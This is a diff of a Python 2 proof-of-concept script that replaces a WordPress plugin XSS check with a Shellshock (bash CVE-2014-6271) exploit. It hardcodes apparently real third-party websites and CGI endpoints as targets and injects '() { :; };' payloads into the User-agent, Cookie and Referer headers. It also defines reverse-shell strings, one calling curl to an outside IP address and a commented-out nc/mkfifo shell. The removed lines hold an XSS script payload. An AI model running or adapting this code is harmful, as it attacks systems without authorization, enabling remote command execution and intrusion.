@@ -10,6 +10,8 @@ import os
 import urllib
 import urllib2
 import sys
+import time
+import codecs
 
 import json
 import traceback
@@ -18,6 +20,8 @@ from pprint import pprint
 from optparse import OptionParser, OptionGroup
 
 from utils import http
+
+COUNT = 1
 
 BEEBEETO_STATEMENT = \
     "This POC is created for security research. "\
@@ -72,7 +76,8 @@ class BaseFrame(object):
         if do_parse:
             (self.options, self.args) = self.base_parser.parse_args()
             # self.options.target = 'anchormediastudio.com'
-            self.options.target = 'www.evangelistadavidviera.com'
+            # self.options.target = 'www.evangelistadavidviera.com'
+            self.options.target = 'http://www.grandleyenda.com'
             self.options.verbose = True
             if not self.options.target:
                 print '\n[*] No target input!\n'
@@ -151,16 +156,14 @@ class BaseFrame(object):
         '''
         return args
 
-
-
 class MyPoc(BaseFrame):
     poc_info = {
         # poc相关信息
         'poc': {
-            'id': 'poc-2014-0195',
-            'name': 'WordPress DZS-VideoGallery /ajax.php XSS漏洞 POC',
-            'author': '我只会打连连看',
-            'create_date': '2014-12-10',
+            'id': 'poc-2015-0032',
+            'name': 'GNU Bash <= 4.3 Shockshell 破壳漏洞 POC',
+            'author': 'Tommy',
+            'create_date': '2015-02-12',
         },
         # 协议相关信息
         'protocol': {
@@ -170,47 +173,95 @@ class MyPoc(BaseFrame):
         },
         # 漏洞相关信息
         'vul': {
-            'app_name': 'WordPress DZS-VideoGallery',
-            'vul_version': [''],
-            'type': 'Cross Site Scripting',
-            'tag': ['WordPress DZS-VideoGallerye', 'xss漏洞', '/wp-content/plugins/dzs-videogallery/ajax.php', 'php'],
-            'desc': '''
-                    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。
-                    DZS-VideoGallery是其中的一个DZS视频库插件。
-                    WordPress DZS-VideoGallery插件中存在跨站脚本漏洞，该漏洞源于程序没有正确过滤用户提交的输入。
-                    当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意脚本代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。
-                    ''',
-            'references': ['http://sebug.net/vuldb/ssvid-61532',
+            'app_name': 'bash',
+            'vul_version': ['<=4.3'],
+            'type': 'Command Execution',
+            'tag': ['bash漏洞', 'CVE-2014-6271', 'ShellShock破壳漏洞', 'cgi'],
+            'desc': '执行shell命令，从而导致信息泄漏、未授权的恶意修改、服务中断',
+            'references': [
+                'http://www.exploit-db.com/exploits/34765/',
+                'http://blog.knownsec.com/2014/09/shellshock_response_profile/',
             ],
         },
     }
 
 
+    '''
+    GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，
+    向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，
+    以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。
+    此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。
+    这些变量可以包含代码，在Shell被调用后会被立即执行。
+    '''
+
     @classmethod
     def verify(cls, args):
-        # verify_url = args['options']['target'] + "/wp-content/plugins/dzs-videogallery/ajax.php"
-        payload = {
-                "ajax":"true",
-                "height":400,
-                "width":610,
-                "type":"vimeo",
-                "source":"%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E"
-                }
-        payload = urllib.urlencode(payload)
-        print payload
-        # verify_url = args['options']['target'] + payload
-        verify_url = args['options']['target']
-        req = urllib2.Request(verify_url, payload)
-        if args['options']['verbose']:
-            print '[*] Request URL: ' + verify_url
-        content = urllib2.urlopen(req).read()
-        if '<script>alert("bb2")</script>' in content:
-            args['success'] = True
-            args['poc_ret']['vul_url'] = verify_url
-        return args
+        # args['options']['target'] = 'https://www.ovh.com/cgi-bin/newOrder/order.cgi'
+        args['options']['verbose'] = True
+        # args['options']['target'] = '
+        args['options']['target'] = 'http://www.rzp.cz/cgi-bin/aps_cacheWEB.sh?VSS_SERV=ZVWSBJFND'
+        # args['options']['target'] = 'http://www.fabricshack.com/cgi-bin/Store/store.cgi'
+        # args['options']['target'] = 'http://niopub.nio.org/cgi-bin/oceanl/oceanl.sh'
+	ip =  args['options']['target']
+	opener = urllib2.build_opener()
+        remote = '46.101.51.58'
+        port = '8080'
+        # reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (remote, port)
+        # reverse_shell="() { ignored;};/bin/bash -c '/bin/ls /tmp;:'"
+        reverse_shell="() { ignored;};/bin/bash -c '/usr/bin/curl 46.101.51.58 ;:'"
+
+	# Modify User-agent header value for Shell Shock test
+	opener.addheaders = [
+                # ('User-agent', '() { :; }; echo Content-Type: text/plain; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
+                ('User-agent', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
+                ('Cookie', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
+                ('Referer', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
+                # ('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'),
+
+                # ('User-agent', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
+                # ('User-agent', 'slll; () { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"; /bin/ls /tmp '),
+                # ('User-agent', 'slll; () { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"; /bin/ls /tmp '),
+                # ('User-agent', '() { :;}; echo "this is a test:"; /bin/ls /tmp && echo ":"; echo "test:"'),
+               # ('User-agent', reverse_shell),
+                # ('User-agent', "() { :; }; /bin/bash -c '/bin/ls /bin'"),
+                # ('User-agent', "() { :; }; /bin/bash -c 'echo test'"),
+                # ('User-agent', "() { :; }; echo \"test\""),
+                # ('Cookie', reverse_shell),
+				('Accept','text/plain'),
+				('Content-type','application/x-www-form-urlencoded'),
+				('Referer','http://www.baidu.com')
+				]
+	try:
+            URL = ip
+            if args['options']['verbose']:
+                print 'requesting ', URL
+            response = opener.open(URL)
+            headers = response.info()
+            print '\n' + '*' * 80
+            print response.getcode()
+            print '*' * 80
+            # print 'test'
+            # print response
+            # print dict(response)
+            print headers
+            print '\n' + '*' * 80
+            status = response.getcode()
+            opener.close()
+            if status==200:
+                if "1a8b8e54b53f63a8efae84e064373f19" in headers:
+                    args['success'] = True
+                    args['poc_ret']['vul_url'] = URL
+                else:
+                    args['success'] = False
+            return args
+
+	except Exception as e:
+            print 'meet error', e
+            opener.close()
+            args['success'] = False
+            return args
 
     exploit = verify
-
 
 
 
